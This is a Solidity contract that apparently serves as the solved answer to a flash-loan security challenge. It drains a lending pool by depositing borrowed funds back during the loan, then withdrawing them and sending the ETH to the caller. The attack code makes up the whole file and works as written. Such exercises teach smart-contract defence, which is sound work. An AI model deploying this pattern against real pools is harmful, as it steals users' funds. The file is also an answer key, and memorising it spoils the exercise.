//SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "../Challenge-2/Lender.sol";

//If you want to test this contract you can do so by changing the contract name to Attack2
//If you have a contract with the name Attack2 already make sure to comment your attack contract out
//You cnan mass comment out a section by highlighting multiple lines & pressing ctrl + / 
contract Attack2Solved {

    //Declalre an instance of the flashloan pool interface
    IFlash pool;

    constructor(IFlash _flash) {
        pool = _flash;
    }

    //This function is called by the test
    function attack() external {

        //Get the intial balance of the pool contract
        uint bal = address(pool).balance;

        //Start the flashloan
        pool.flashLoan(bal);

        //Withdraw the funds from the flashloan
        pool.withdraw();

        //Send the balance to the attacker
        (bool success, ) = msg.sender.call{value: bal}("");

        //Check that the transfer went successful
        require(success, "ERR:OT"); //OT => On Transfer
    }

    //This function is called by the flashloan pool contract
    function receiveLoan() external payable {

        //Deposit funds into pool
        pool.deposit{value: msg.value}();
    }

    //This is here so that our contract can receive ETH
    receive() external payable{}
}